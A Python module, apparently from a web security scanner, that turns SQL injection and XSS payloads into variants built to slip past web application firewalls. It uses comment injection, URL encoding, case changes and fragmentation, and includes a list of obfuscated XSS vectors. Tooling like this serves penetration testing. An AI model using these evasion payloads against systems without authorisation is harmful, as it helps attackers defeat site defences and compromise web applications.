from __future__ import annotations

import random
import re
from urllib.parse import quote


# ---------------------------------------------------------------------------
# Individual mutation strategies
# ---------------------------------------------------------------------------

def _comment_inject(payload: str) -> list[str]:
    """Insert SQL-style comments between tokens."""
    results: list[str] = []
    spaced = payload.replace(" ", "/**/")
    if spaced != payload:
        results.append(spaced)
    # Also try inline MySQL comment variant
    spaced_bang = payload.replace(" ", "/*!*/")
    if spaced_bang != payload and spaced_bang not in results:
        results.append(spaced_bang)
    return results


def _url_encode(payload: str) -> list[str]:
    """Single and double URL-encoding."""
    results: list[str] = []
    single = quote(payload, safe="")
    results.append(single)
    double = quote(single, safe="")
    if double != single:
        results.append(double)
    return results


def _case_mutate(payload: str) -> list[str]:
    """Generate case-alternation variants for alphabetic payloads."""
    results: list[str] = []
    # aLtErNaTiNg case
    alternating = "".join(
        c.upper() if i % 2 == 0 else c.lower()
        for i, c in enumerate(payload)
    )
    if alternating != payload:
        results.append(alternating)
    # Random case variant (deterministic seed so it's reproducible)
    rng = random.Random(hash(payload) & 0xFFFF_FFFF)
    rand_case = "".join(
        c.upper() if rng.random() > 0.5 else c.lower()
        for c in payload
    )
    if rand_case != payload and rand_case not in results:
        results.append(rand_case)
    return results


_XSS_OBFUSCATIONS: list[str] = [
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    '<scr<script>ipt>alert(1)</scr<script>ipt>',
]


def _xss_obfuscate(payload: str) -> list[str]:
    """If *payload* contains script/alert patterns, add obfuscated XSS vectors."""
    lower = payload.lower()
    if "<script" not in lower and "alert" not in lower and "onerror" not in lower:
        return []
    return list(_XSS_OBFUSCATIONS)


def _fragment(payload: str) -> list[str]:
    """Break payload via concatenation / comments."""
    results: list[str] = []
    # SQL comment fragment
    if " " in payload:
        parts = payload.split(" ", 1)
        fragmented = f"{parts[0]}--\n{parts[1]}"
        results.append(fragmented)
    # MySQL string concat
    concat_variant = re.sub(
        r"'([^']*)'",
        lambda m: f"CONCAT('{m.group(1)[:len(m.group(1))//2]}','{m.group(1)[len(m.group(1))//2:]}')",
        payload,
    )
    if concat_variant != payload:
        results.append(concat_variant)
    return results


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

_STRATEGY_MAP: dict[str, callable] = {
    "comment_inject": _comment_inject,
    "url_encode": _url_encode,
    "case_mutate": _case_mutate,
    "xss_obfuscate": _xss_obfuscate,
    "fragment": _fragment,
}

ALL_STRATEGIES = tuple(_STRATEGY_MAP.keys())


def mutate_payload(
    payload: str,
    strategies: tuple[str, ...] = ALL_STRATEGIES,
) -> list[str]:
    """
    Generate mutated variants of *payload* using the given strategies.

    Returns a list of unique mutations (does NOT include the original).
    """
    seen: set[str] = {payload}
    mutations: list[str] = []

    for name in strategies:
        fn = _STRATEGY_MAP.get(name)
        if not fn:
            continue
        for variant in fn(payload):
            if variant and variant not in seen:
                seen.add(variant)
                mutations.append(variant)

    return mutations


def mutate_payloads(
    payload_sets: dict[str, list[str]],
    strategies: tuple[str, ...] = ALL_STRATEGIES,
) -> dict[str, list[str]]:
    """
    Expand every payload family with WAF-bypass mutations.

    Returns a new dict where each family contains the originals followed by
    every unique mutation.
    """
    expanded: dict[str, list[str]] = {}
    for vuln_type, payloads in payload_sets.items():
        seen: set[str] = set()
        all_payloads: list[str] = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                all_payloads.append(p)
            for m in mutate_payload(p, strategies):
                if m not in seen:
                    seen.add(m)
                    all_payloads.append(m)
        expanded[vuln_type] = all_payloads
    return expanded
